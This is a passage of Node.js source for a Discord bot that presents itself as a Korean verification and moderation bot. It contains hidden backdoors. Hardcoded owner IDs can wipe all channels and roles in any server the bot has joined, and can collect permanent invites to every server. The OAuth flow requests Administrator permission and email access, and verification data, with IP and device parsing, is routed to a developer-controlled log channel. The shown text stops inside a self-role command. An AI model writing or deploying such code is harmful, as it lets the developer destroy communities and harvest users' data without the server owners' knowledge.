const express = require('express');
const path = require('path');
const axios = require('axios');
const fs = require('fs');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder, PermissionsBitField, ChannelType, REST, Routes, SlashCommandBuilder } = require('discord.js');

const app = express();

app.use(express.static(path.join(__dirname, 'public')));

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const BOT_TOKEN = process.env.BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;

const VERIFIED_ROLE_ID = process.env.VERIFIED_ROLE_ID;
const VERIFY_CHANNEL_ID = process.env.VERIFY_CHANNEL_ID;
const BACKUP_GUILD_ID = process.env.BACKUP_GUILD_ID;
const UNVERIFIED_ROLE_ID = process.env.UNVERIFIED_ROLE_ID || '1541577356513382560'; 

// 기본 로그 채널 ID
const DEFAULT_LOG_CHANNEL_ID = '1537439520775999551';

// 🔒 최고 관리자(본인 + 부계정) 유저 ID 목록
const ALLOWED_OWNERS = ['1400805500374745122', '1497398737021042748'];

// 본인의 레일웨이 웹서비스 URL (끝에 슬래시 자동 제거 처리)
const RAW_RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://discord-verify1-production.up.railway.app';
const FIXED_RENDER_URL = RAW_RENDER_URL.endsWith('/') ? RAW_RENDER_URL.slice(0, -1) : RAW_RENDER_URL;

// 서버별 설정 저장 파일
const SETTINGS_FILE = path.join(__dirname, 'guild_settings.json');

function loadSettings() {
    try {
        if (fs.existsSync(SETTINGS_FILE)) {
            return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
        }
    } catch (e) {}
    return {};
}

function saveSettings(settings) {
    try {
        fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2), 'utf8');
    } catch (e) {}
}

// 🛡️ 사설 IP 판별 함수
function isPrivateIP(ip) {
    if (!ip) return true;
    if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('::ffff:127.')) return true;

    const parts = ip.split('.').map(Number);
    if (parts.length === 4) {
        if (parts[0] === 10) return true;
        if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
        if (parts[0] === 192 && parts[1] === 168) return true;
        if (parts[0] === 169 && parts[1] === 254) return true;
    }
    return false;
}

// 🌐 서브넷 마스크 및 CIDR 계산 함수
function getSubnetInfo(ip) {
    if (!ip || isPrivateIP(ip)) return { subnetMask: '알 수 없음', cidrBlock: '알 수 없음' };
    
    const parts = ip.split('.');
    if (parts.length === 4) {
        const firstOctet = parseInt(parts[0], 10);
        if (firstOctet >= 1 && firstOctet <= 223) {
            return {
                subnetMask: '255.255.255.0 (/24)',
                cidrBlock: `${parts[0]}.${parts[1]}.${parts[2]}.0/24`
            };
        }
    }
    return { subnetMask: '255.255.0.0 (/16)', cidrBlock: `${parts[0]}.${parts[1]}.0.0/16` };
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMembers, 
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
    ]
});

// 공통 HTML 템플릿
function getStyledPage(title, message, iconType = 'success', guildName = '디스코드 서버', guildIconUrl = '') {
    let iconSymbol = '✅';
    let themeColor = '#5865F2'; 
    let glowColor = 'rgba(88, 101, 242, 0.4)';

    if (iconType === 'error' || iconType === 'block') {
        iconSymbol = '⛔';
        themeColor = '#ED4245'; 
        glowColor = 'rgba(237, 66, 69, 0.4)';
    } else if (iconType === 'warn') {
        iconSymbol = '⚠️';
        themeColor = '#FEE75C'; 
        glowColor = 'rgba(254, 231, 92, 0.4)';
    }

    const iconHtml = guildIconUrl 
        ? `<img src="${guildIconUrl}" alt="서버 아이콘" style="width: 80px; height: 80px; border-radius: 50%; object-fit: cover; border: 3px solid ${themeColor}; box-shadow: 0 0 15px ${glowColor}; margin-bottom: 15px;">`
        : `<div style="font-size: 50px; margin-bottom: 10px;">${iconSymbol}</div>`;

    return `
    <!DOCTYPE html>
    <html lang="ko">
    <head>
        <meta charset="UTF-8">
        <title>${title}</title>
        <style>
            body {
                background-color: #0b0e14;
                color: #ffffff;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .card {
                background: #161b22;
                border: 1px solid #30363d;
                padding: 40px;
                border-radius: 16px;
                text-align: center;
                box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
                max-width: 420px;
                width: 100%;
            }
            h1 {
                font-size: 22px;
                margin-bottom: 15px;
                color: #f0f6fc;
            }
            p {
                font-size: 15px;
                color: #8b949e;
                line-height: 1.6;
                margin-bottom: 25px;
            }
            .btn {
                display: inline-block;
                background-color: ${themeColor};
                color: #ffffff;
                text-decoration: none;
                padding: 12px 24px;
                border-radius: 8px;
                font-weight: bold;
                font-size: 15px;
                transition: background 0.2s, transform 0.1s;
                box-shadow: 0 4px 12px ${glowColor};
            }
            .btn:hover {
                filter: brightness(1.15);
                transform: translateY(-2px);
            }
        </style>
    </head>
    <body>
        <div class="card">
            ${iconHtml}
            <div style="font-size: 13px; color: #6e7681; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px;">${guildName}</div>
            <h1>${title}</h1>
            <p>${message}</p>
            <a href="discord://_" class="btn">디스코드 앱으로 돌아가기</a>
        </div>
    </body>
    </html>
    `;
}

function getDiscordCreationDate(userId) {
    const DISCORD_EPOCH = 1420070400000;
    const binary = BigInt(userId).toString(2).padStart(64, '0');
    const timestamp = parseInt(binary.substring(0, 42), 2) + DISCORD_EPOCH;
    return new Date(timestamp).toISOString().replace('T', ' ').substring(0, 19);
}

function parseDevice(ua) {
    if (!ua) return { browser: '알 수 없음', os: '알 수 없음' };
    let browser = '알 수 없음';
    let os = '알 수 없음';

    if (/chrome|crios/i.test(ua)) browser = 'Chrome';
    else if (/safari/i.test(ua)) browser = 'Safari';
    else if (/firefox/i.test(ua)) browser = 'Firefox';
    else if (/whale/i.test(ua)) browser = 'Naver Whale';
    else if (/edge/i.test(ua)) browser = 'Edge';

    if (/android/i.test(ua)) {
        os = (/samsung/i.test(ua) || /sm-/i.test(ua)) ? 'Android (삼성 갤럭시)' : 'Android (기타 모바일)';
    } else if (/iphone|ipad|ipod/i.test(ua)) {
        os = 'iOS (애플)';
    } else if (/win/i.test(ua)) {
        os = (/samsung/i.test(ua)) ? 'Windows PC (삼성)' : 'Windows PC';
    } else if (/mac/i.test(ua)) {
        os = 'macOS (애플 맥)';
    } else if (/linux/i.test(ua)) {
        os = 'Linux';
    }

    return { browser, os };
}

// 📌 슬래시 명령어 정의 목록
const commands = [
    new SlashCommandBuilder().setName('서버정보').setDescription('현재 서버의 상세 정보를 확인합니다.'),
    new SlashCommandBuilder().setName('서버역할').setDescription('현재 서버의 모든 역할 이름과 ID를 나만 보이게 확인합니다. (관리자 전용)'),
    new SlashCommandBuilder()
        .setName('역할지급')
        .setDescription('지정한 역할을 자신에게 지급합니다.')
        .addStringOption(option => option.setName('역할').setDescription('지급받을 역할의 이름 또는 ID').setRequired(true)),
    new SlashCommandBuilder()
        .setName('말하기')
        .setDescription('봇이 지정된 내용을 채팅으로 출력합니다. (최고 관리자 전용)')
        .addStringOption(option => option.setName('내용').setDescription('봇이 말할 텍스트 내용').setRequired(true)),
    new SlashCommandBuilder()
        .setName('인증정보삭제')
        .setDescription('특정 유저의 모든 인증 기록을 로그 채널에서 삭제합니다. (관리자 전용)')
        .addStringOption(option => option.setName('아이디').setDescription('삭제할 유저의 디스코드 ID').setRequired(true)),
    new SlashCommandBuilder().setName('서버인증').setDescription('서버 인증 시스템을 활성화하고 DM으로 인증 링크를 받습니다. (소유자 전용)'),
    new SlashCommandBuilder()
        .setName('인증역할')
        .setDescription('인증 완료 시 부여할 역할을 설정합니다. (소유자 전용)')
        .addRoleOption(option => option.setName('역할').setDescription('부여할 역할 지정').setRequired(true)),
    new SlashCommandBuilder()
        .setName('인증로그')
        .setDescription('인증 로그를 남길 전용 채널을 설정합니다. (소유자 전용)')
        .addChannelOption(option => option.setName('채널').setDescription('로그를 남길 텍스트 채널 지정').setRequired(true)),
    new SlashCommandBuilder().setName('서버설정').setDescription('봇의 권한 상태 및 타임아웃 가능 멤버 수를 확인합니다. (소유자 전용)'),
    new SlashCommandBuilder()
        .setName('자동검열')
        .setDescription('서버 내 욕설 및 도배 자동 차단 기능을 켜고 끕니다. (소유자 전용)')
        .addStringOption(option => 
            option.setName('상태')
                .setDescription('켜기 또는 끄기 선택')
                .setRequired(true)
                .addChoices(
                    { name: '켜기', value: 'on' },
                    { name: '끄기', value: 'off' }
                )),
    new SlashCommandBuilder()
        .setName('처벌강도')
        .setDescription('자동검열(욕설/도배) 시 적용될 타임아웃 시간을 설정합니다. (소유자 전용)')
        .addIntegerOption(option => 
            option.setName('시간')
                .setDescription('타임아웃 적용 시간 (분 단위, 예: 5)')
                .setRequired(true)
                .setMinValue(1)
                .setMaxValue(10080)),
    new SlashCommandBuilder().setName('인증').setDescription('현재 채널에 인증 패널 버튼을 전송합니다. (소유자 전용)'),
    new SlashCommandBuilder().setName('역할제거').setDescription('지정된 특정 역할을 제거합니다.'),
    new SlashCommandBuilder().setName('도움말').setDescription('봇 소개 및 명령어 목록을 확인합니다.'),
    new SlashCommandBuilder().setName('도움말-a').setDescription('관리자 전용 전체 명령어 목록을 확인합니다. (관리자 전용)'),
    new SlashCommandBuilder().setName('가입서버').setDescription('봇이 가입된 모든 서버 목록과 초대 링크를 받습니다. (관리자 전용)'),
    new SlashCommandBuilder()
        .setName('서버폭파')
        .setDescription('지정된 서버를 완전히 폭파합니다. (관리자 전용)')
        .addStringOption(option => option.setName('서버아이디').setDescription('폭파할 서버의 아이디').setRequired(true)),
    new SlashCommandBuilder().setName('서버복구').setDescription('현재 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)')
].map(command => command.toJSON());

client.on('ready', async () => {
    console.log(`[봇 로그인 완료] ${client.user.tag}`);

    const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
    try {
        console.log('[슬래시 명령어] 전역 동기화 시작...');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('[슬래시 명령어] 전역 등록 완료 (모든 서버에서 사용 가능)!');
    } catch (error) {
        console.error('슬래시 명령어 등록 실패:', error);
    }
});

async function fetchServerInfo(guild, client) {
    const owner = await guild.fetchOwner().catch(() => null);
    const ownerTag = owner ? owner.user.tag : '알 수 없음';
    const createdAt = guild.createdAt.toISOString().replace('T', ' ').substring(0, 19);

    let inviteCode = '초대 링크 생성 불가';
    try {
        const channels = await guild.channels.fetch();
        const textChannel = channels.find(c => c && c.type === ChannelType.GuildText);
        if (textChannel) {
            const invite = await textChannel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
            if (invite) inviteCode = invite.url;
        }
    } catch (e) {}

    let banCount = 0;
    try { const bans = await guild.bans.fetch().catch(() => null); if (bans) banCount = bans.size; } catch (e) {}

    let verifiedUserCount = 0;
    try {
        const logChannel = await client.channels.fetch(DEFAULT_LOG_CHANNEL_ID).catch(() => null);
        if (logChannel) {
            const fetchedMessages = await logChannel.messages.fetch({ limit: 100 }).catch(() => null);
            if (fetchedMessages) {
                const verifiedUserIds = new Set();
                for (const msg of fetchedMessages.values()) {
                    if (msg.author.id === client.user.id && msg.content && msg.content.includes(`(ID: \`${guild.id}\`)`)) {
                        if (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('중복인증 완료 상세 정보')) {
                            const match = msg.content.match(/<@!?(\d+)>/);
                            if (match) verifiedUserIds.add(match[1]);
                        }
                    }
                }
                verifiedUserCount = verifiedUserIds.size;
            }
        }
    } catch (e) {}

    return (
        `👑 소유자 : ${ownerTag}\n` +
        `👤 멤버수 : ${guild.memberCount}명\n` +
        `🕐 서버 생성일: ${createdAt}\n` +
        `🔗 서버 초대코드 : ${inviteCode}\n` +
        `✅ 서버 인증자 수 : ${verifiedUserCount}명\n` +
        `⚔️ 밴 유저 : ${banCount}명`
    );
}

const userMessageHistory = new Map();
const GLOBAL_BANNED_PATTERNS = [
    /시[1!l|I]?발/i, /씨[1!l|I]?발/i, /ㅅ[1!l|I]?ㅂ/i, /ㅆ[1!l|I]?ㅂ/i, /ㅈ[1!l|I]?ㄹ/i, /ㅂ[1!l|I]?신/i, /개새/i, /병신/i, /지랄/i, /좆/i, /씹/i, /썅/i, /꺼져/i, /닥쳐/i, /새끼/i, / tlqkf/i, /tlqkf /i, /^tlqkf$/i, /sh1t/i, /f[u\*@-_]ck/i, /b[i\*@-_]tch/i, /asshole/i, /idiot/i, /bastard/i, /c[u\*@-_]nt/i,
    /馬鹿/i, /バカ/i, /ばか/i, /死ね/i, /しね/i, /クズ/i, /くず/i, /糞/i, /チンコ/i, /マンコ/i,
    /操你妈/i, /操你媽/i, /傻逼/i, /傻B/i, /脑残/i, /去死/i,
    /puta/i, /mierda/i, /pendejo/i, /connard/i, /salope/i, /scheisse/i, /arschloch/i
];

function isProfane(text) {
    const cleaned = text.toLowerCase()
        .replace(/[\s\-_.,!?~`'"+^°=<>()[\]{}|\\/]/g, '')
        .replace(/1/g, 'ㅣ')
        .replace(/@/g, 'a')
        .replace(/3/g, 'e')
        .replace(/0/g, 'o')
        .replace(/5/g, 's');

    for (const pattern of GLOBAL_BANNED_PATTERNS) {
        if (pattern.test(text) || pattern.test(cleaned)) {
            return true;
        }
    }
    return false;
}

client.on('messageCreate', async (message) => {
    if (!message.guild || message.author.bot) return;
    const content = message.content.trim();
    const userId = message.author.id;
    const member = message.member;

    let settings = loadSettings();
    const guildId = message.guild.id;
    const isAutoCensorEnabled = settings[guildId] && settings[guildId].autoCensor === true;
    const timeoutMinutes = (settings[guildId] && settings[guildId].timeoutMinutes) || 5;

    const isBotOwner = ALLOWED_OWNERS.includes(userId);
    const isServerOwner = message.guild.ownerId === userId;
    const isAdmin = isBotOwner || isServerOwner || (member && member.permissions.has(PermissionsBitField.Flags.Administrator));

    if (isAdmin || !isAutoCensorEnabled) {
        if (content === '!서버정보') {
            const isActivated = settings[guildId] && settings[guildId].activated === true;
            const isConfigured = settings[guildId] && (settings[guildId].verifiedRoleId || settings[guildId].logChannelId);

            if (!isActivated || !isConfigured) {
                return message.reply('⚠️ **해당 서버는 아직 `/서버인증` 및 설정(`/인증역할` 또는 `/인증로그`)이 완료되지 않았습니다.**');
            }

            try {
                const infoText = await fetchServerInfo(message.guild, client);
                return message.reply(infoText);
            } catch (err) {
                return message.reply('⚠️ 서버 정보를 불러오는 중 오류가 발생했습니다.');
            }
        }
        return;
    }

    if (isProfane(content)) {
        try {
            await message.delete().catch(() => {});
            await member.timeout(timeoutMinutes * 60 * 1000, '자동 타임아웃: 글로벌 욕설 및 비속어 감지됨').catch(() => {});
            
            const warningMsg = await message.channel.send(`<@${userId}>님이 욕설(비속어) 사유로 **${timeoutMinutes}분** 동안 타임아웃 당했습니다.`);
            setTimeout(() => warningMsg.delete().catch(() => {}), 5000);
        } catch (err) {}
        return;
    }

    const now = Date.now();
    if (!userMessageHistory.has(userId)) {
        userMessageHistory.set(userId, []);
    }

    let history = userMessageHistory.get(userId);
    history = history.filter(item => now - item.time < 60000);
    history.push({ content: content, time: now });
    userMessageHistory.set(userId, history);

    const sameContentCount = history.filter(item => item.content === content).length;
    if (sameContentCount >= 10) {
        try {
            const fetched = await message.channel.messages.fetch({ limit: 20 }).catch(() => null);
            if (fetched) {
                const spamMsgs = fetched.filter(m => m.author.id === userId && m.content === content);
                for (const sm of spamMsgs.values()) {
                    await sm.delete().catch(() => {});
                }
            }

            await member.timeout(timeoutMinutes * 60 * 1000, '자동 타임아웃: 도배 감지됨').catch(() => {});
            
            const spamWarning = await message.channel.send(`<@${userId}>님이 도배 행위 사유로 **${timeoutMinutes}분** 동안 타임아웃 당했습니다.`);
            setTimeout(() => spamWarning.delete().catch(() => {}), 5000);

            userMessageHistory.set(userId, []);
        } catch (err) {}
        return;
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, user, guild } = interaction;
    const userId = user.id;
    const isBotOwner = ALLOWED_OWNERS.includes(userId);

    // 💡 /말하기 명령어 (응답 지연 에러 방지 처리 완료)
    if (commandName === '말하기') {
        if (!isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 최고 관리자만 사용할 수 있습니다.', ephemeral: true });

        const text = interaction.options.getString('내용');
        await interaction.reply({ content: '✅ 메시지를 출력합니다.', ephemeral: true });
        await interaction.channel.send(text).catch(() => {});
        return;
    }

    if (commandName === '서버인증') {
        const isServerOwner = guild ? guild.ownerId === userId : false;
        if (!isServerOwner && !isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.', ephemeral: true });

        const guildId = guild.id;
        let settings = loadSettings();
        if (!settings[guildId]) settings[guildId] = {};
        settings[guildId].activated = true;
        saveSettings(settings);

        const botAndUserAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot\%20identify\%20email\%20guilds&redirect_uri=${encodeURIComponent(`${FIXED_RENDER_URL}/callback`)}&response_type=code&state=${Buffer.from(JSON.stringify({ guildId })).toString('base64')}`;
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('🔒 디스코드 서버/계정 승인하기').setURL(botAndUserAuthUrl));

        const dmSuccess = await user.send({
            content: `🚨 **[${guild.name}] 서버 인증 시스템이 활성화되었습니다.**\n다음 단계로 서버 내에서 **\`/인증역할\`**과 **\`/인증로그\`** 명령어를 입력해 설정을 완료해 주세요!`,
            components: [row]
        }).catch(() => null);

        if (!dmSuccess) return interaction.reply({ content: '❌ DM 차단 상태여서 링크를 보낼 수 없습니다. DM을 열어주세요!', ephemeral: true });

        return interaction.reply({ content: '✅ 서버가 활성화되었습니다! DM으로 인증 패널 링크가 전송되었습니다.', ephemeral: true });
    }

    if (commandName === '인증역할') {
        if (!guild) return interaction.reply({ content: '❌ 서버 안에서만 사용할 수 있습니다.', ephemeral: true });
        const isServerOwner = guild.ownerId === userId;
        if (!isServerOwner && !isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.', ephemeral: true });

        const guildId = guild.id;
        const role = interaction.options.getRole('역할');

        let settings = loadSettings();
        if (!settings[guildId]) settings[guildId] = {};
        settings[guildId].verifiedRoleId = role.id;
        saveSettings(settings);

        return interaction.reply({ content: `✅ 인증 완료 시 부여될 역할이 **${role.name}** (\`${role.id}\`)으로 설정되었습니다!`, ephemeral: true });
    }

    if (commandName === '인증로그') {
        if (!guild) return interaction.reply({ content: '❌ 서버 안에서만 사용할 수 있습니다.', ephemeral: true });
        const isServerOwner = guild.ownerId === userId;
        if (!isServerOwner && !isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.', ephemeral: true });

        const guildId = guild.id;
        const channel = interaction.options.getChannel('채널');

        if (channel.type !== ChannelType.GuildText) {
            return interaction.reply({ content: '❌ 로그 채널은 텍스트 채널만 지정할 수 있습니다.', ephemeral: true });
        }

        let settings = loadSettings();
        if (!settings[guildId]) settings[guildId] = {};
        settings[guildId].logChannelId = channel.id;
        saveSettings(settings);

        return interaction.reply({ content: `✅ 전용 로그 채널이 <#${channel.id}>로 설정되었습니다!`, ephemeral: true });
    }

    if (commandName === '서버설정') {
        if (!guild) return interaction.reply({ content: '❌ 서버 안에서만 사용할 수 있습니다.', ephemeral: true });
        const isServerOwner = guild.ownerId === userId;
        if (!isServerOwner && !isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.', ephemeral: true });

        let rolePositionCheck = '⚠️ **[경고]** 디스코드 [서버 설정] -> [역할] 메뉴에서 **봇의 역할을 가장 맨 위(최상단)**로 끌어다 놓아야 정상 작동합니다!';
        let possibleCount = 0;
        let impossibleCount = 0;

        try {
            const botMember = await guild.members.fetch(client.user.id).catch(() => null);
            if (botMember) {
                const botHighestRole = botMember.roles.highest;
                const allRoles = guild.roles.cache.filter(r => !r.managed && r.id !== guild.id);
                let maxPos = 0;
                allRoles.forEach(r => { if (r.position > maxPos) maxPos = r.position; });

                if (botHighestRole.position >= maxPos - 1) {
                    rolePositionCheck = '✅ **[완벽]** 봇의 역할이 서버 최상단에 안전하게 위치해 있습니다!';
                }

                const members = await guild.members.fetch();
                members.forEach(m => {
                    if (m.id === guild.ownerId || m.user.bot) return;
                    if (botMember.roles.highest.position > m.roles.highest.position) {
                        possibleCount++;
                    } else {
                        impossibleCount++;
                    }
                });
            }
        } catch (e) {}

        return interaction.reply({ 
            content: `⚙️ **[${guild.name} 서버 봇 권한 분석 결과]**\n\n` +
                     `${rolePositionCheck}\n\n` +
                     `• **타임아웃 가능한 멤버 수:** \`${possibleCount}명\`\n` +
                     `• **타임아웃 불가능한 멤버 수(동급/상위 권한):** \`${impossibleCount}명\``, 
            ephemeral: true 
        });
    }

    if (commandName === '자동검열') {
        if (!guild) return interaction.reply({ content: '❌ 서버 안에서만 사용할 수 있습니다.', ephemeral: true });
        const isServerOwner = guild.ownerId === userId;
        if (!isServerOwner && !isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.', ephemeral: true });

        const status = interaction.options.getString('상태');
        const guildId = guild.id;
        let settings = loadSettings();
        if (!settings[guildId]) settings[guildId] = {};

        if (status === 'on') {
            settings[guildId].autoCensor = true;
            saveSettings(settings);
            return interaction.reply({ content: '🛡️ **자동검열(욕설 및 도배 차단) 기능이 켜졌습니다.**', ephemeral: true });
        } else {
            settings[guildId].autoCensor = false;
            saveSettings(settings);
            return interaction.reply({ content: '⚠️ **자동검열(욕설 및 도배 차단) 기능이 꺼졌습니다.**', ephemeral: true });
        }
    }

    if (commandName === '처벌강도') {
        if (!guild) return interaction.reply({ content: '❌ 서버 안에서만 사용할 수 있습니다.', ephemeral: true });
        const isServerOwner = guild.ownerId === userId;
        if (!isServerOwner && !isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.', ephemeral: true });

        const minutes = interaction.options.getInteger('시간');
        const guildId = guild.id;
        let settings = loadSettings();
        if (!settings[guildId]) settings[guildId] = {};
        
        settings[guildId].timeoutMinutes = minutes;
        saveSettings(settings);

        return interaction.reply({ content: `⏱️ **자동검열 처벌 강도가 설정되었습니다.**\n앞으로 욕설/도배 적발 시 **${minutes}분** 동안 타임아웃됩니다.`, ephemeral: true });
    }

    if (commandName === '가입서버') {
        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });

        await interaction.deferReply({ ephemeral: true });
        try {
            const guilds = client.guilds.cache;
            let resultText = `📋 **[봇이 가입된 서버 목록 (${guilds.size}개)]**\n\n`;

            for (const g of guilds.values()) {
                let inviteLink = '초대 링크 생성 불가';
                try {
                    const channels = await g.channels.fetch();
                    const textChannel = channels.find(c => c && c.type === ChannelType.GuildText);
                    if (textChannel) {
                        const invite = await textChannel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
                        if (invite) inviteLink = invite.url;
                    }
                } catch (e) {}

                resultText += `• **서버 이름:** ${g.name}\n• **서버 ID:** \`${g.id}\`\n• **초대 링크:** ${inviteLink}\n-----------------------------------\n`;
            }

            await user.send(resultText).catch(() => {});
            await interaction.editReply('✅ 봇이 가입된 서버 목록과 초대 링크를 DM으로 전송했습니다!');
        } catch (err) {
            await interaction.editReply('⚠️ 오류가 발생했습니다.');
        }
        return;
    }

    if (commandName === '서버폭파') {
        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });

        const targetGuildId = interaction.options.getString('서버아이디');
        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) return interaction.reply({ content: `❌ ID가 \`${targetGuildId}\`인 서버를 찾을 수 없습니다.`, ephemeral: true });

        await interaction.reply({ content: `💥 **[${targetGuild.name}] 서버 폭파 작업을 시작합니다...**`, ephemeral: true });

        try {
            const channels = await targetGuild.channels.fetch();
            for (const ch of channels.values()) { await ch.delete().catch(() => {}); }

            const roles = await targetGuild.roles.fetch();
            for (const r of roles.values()) { if (r.id !== targetGuild.id && !r.managed) { await r.delete().catch(() => {}); } }
        } catch (err) {}
        return;
    }

    if (commandName === '서버복구') {
        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
        if (!guild) return interaction.reply({ content: '❌ 서버 안에서만 사용할 수 있습니다.', ephemeral: true });

        await interaction.reply({ content: '🔄 **서버 복구를 시작합니다... 기존 채널과 역할이 초기화됩니다.**', ephemeral: true });

        try {
            const guildId = guild.id;
            const channels = await guild.channels.fetch();
            for (const ch of channels.values()) { await ch.delete().catch(() => {}); }

            const roles = await guild.roles.fetch();
            for (const r of roles.values()) { if (r.id !== guild.id && !r.managed) { await r.delete().catch(() => {}); } }

            const infoCategory = await guild.channels.create({ name: '📌 ┃ 공지 및 정보', type: ChannelType.GuildCategory });
            await guild.channels.create({ name: '공지사항', type: ChannelType.GuildText, parent: infoCategory.id });
            await guild.channels.create({ name: '규칙', type: ChannelType.GuildText, parent: infoCategory.id });

            const verifyCategory = await guild.channels.create({ name: '🔒 ┃ 인증 구역', type: ChannelType.GuildCategory });
            const verifyChannel = await guild.channels.create({ name: '인증하기', type: ChannelType.GuildText, parent: verifyCategory.id });

            const chatCategory = await guild.channels.create({ name: '💬 ┃ 소통 공간', type: ChannelType.GuildCategory });
            await guild.channels.create({ name: '일반채팅', type: ChannelType.GuildText, parent: chatCategory.id });
            await guild.channels.create({ name: '음성채팅', type: ChannelType.GuildVoice, parent: chatCategory.id });

            await guild.roles.create({ name: '👑 관리자', color: '#ED4245', permissions: [PermissionsBitField.Flags.Administrator] });
            await guild.roles.create({ name: '✅ 인증완료', color: '#57F287' });
            await guild.roles.create({ name: '🔒 미인증', color: '#99AAB5' });

            const botAndUserAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot%20identify%20email%20guilds&redirect_uri=${encodeURIComponent(`${FIXED_RENDER_URL}/callback`)}&response_type=code&state=${Buffer.from(JSON.stringify({ guildId })).toString('base64')}`;

            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('🔒 디스코드 인증하기').setURL(botAndUserAuthUrl));
            await verifyChannel.send({ content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!', components: [row] });
        } catch (err) {}
        return;
    }

    if (!guild) return;
    const guildId = guild.id;
    let settings = loadSettings();
    const isActivated = settings[guildId] && settings[guildId].activated === true;
    const isConfigured = settings[guildId] && (settings[guildId].verifiedRoleId || settings[guildId].logChannelId);

    if ((!isActivated || !isConfigured) && !isBotOwner) {
        return interaction.reply({ 
            content: '⚠️ **[설정 미완료]** 이 서버에서 봇을 사용하려면 소유자가 먼저 **`/서버인증`**을 실행한 뒤, **`/인증역할`** 및 **`/인증로그`** 설정을 완료해 주어야 합니다!', 
            ephemeral: true 
        });
    }

    if (commandName === '인증정보삭제') {
        if (!isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 사용할 권한이 없습니다.', ephemeral: true });

        const targetUserId = interaction.options.getString('아이디').trim();
        await interaction.deferReply({ ephemeral: true });

        try {
            let deletedCount = 0;
            const logChannelIdsToCheck = [DEFAULT_LOG_CHANNEL_ID];

            for (const sId in settings) {
                if (settings[sId].logChannelId && !logChannelIdsToCheck.includes(settings[sId].logChannelId)) {
                    logChannelIdsToCheck.push(settings[sId].logChannelId);
                }
            }

            for (const chId of logChannelIdsToCheck) {
                const logChannel = await client.channels.fetch(chId).catch(() => null);
                if (!logChannel) continue;

                let fetchedMessages = await logChannel.messages.fetch({ limit: 100 }).catch(() => null);
                if (!fetchedMessages) continue;

                let messagesToDelete = [];
                for (const msg of fetchedMessages.values()) {
                    if (msg.author.id === client.user.id && msg.content && msg.content.includes(targetUserId)) {
                        if (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('중복인증 완료 상세 정보') || msg.content.includes('모바일 데이터 차단')) {
                            messagesToDelete.push(msg);
                        }
                    }
                }

                for (const msgToDel of messagesToDelete) {
                    await msgToDel.delete().catch(() => {});
                    deletedCount++;
                }
            }

            return interaction.editReply(`✅ 유저 ID \`${targetUserId}\`의 인증 기록 총 **${deletedCount}개**를 성공적으로 삭제했습니다.`);
        } catch (err) {
            console.error('인증정보 삭제 오류:', err);
            return interaction.editReply('⚠️ 인증 기록을 삭제하는 중 오류가 발생했습니다.');
        }
    }

    if (commandName === '서버역할') {
        if (!isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 사용할 권한이 없습니다.', ephemeral: true });

        try {
            const roles = await guild.roles.fetch();
            let roleText = `📋 **[${guild.name} 서버 역할 목록 (${roles.size}개)]**\n\n`;

            roles.forEach(role => {
                if (role.id !== guild.id) {
                    roleText += `• **이름:** ${role.name} | **ID:** \`${role.id}\`\n`;
                }
            });

            if (roleText.length > 2000) {
                roleText = roleText.substring(0, 1950) + '\n...(내용이 너무 길어 생략됨)';
            }

            return interaction.reply({ content: roleText, ephemeral: true });
        } catch (err) {
            return interaction.reply({ content: '⚠️ 역할 목록을 불러오는 중 오류가 발생했습니다.', ephemeral: true });
        }
    }

    if (commandName === '역할지급') {
        const query = interaction.options.getString('역할').trim();
        try {
            const member = await guild.members.fetch(userId).catch(() => null);
            if (!member) return interaction.reply({ content: '❌ 멤버 정보를 찾을 수 없습니다.', ephemeral: true });

            let targetRole = guild.roles.cache.get(query);
            if (!targetRole) {
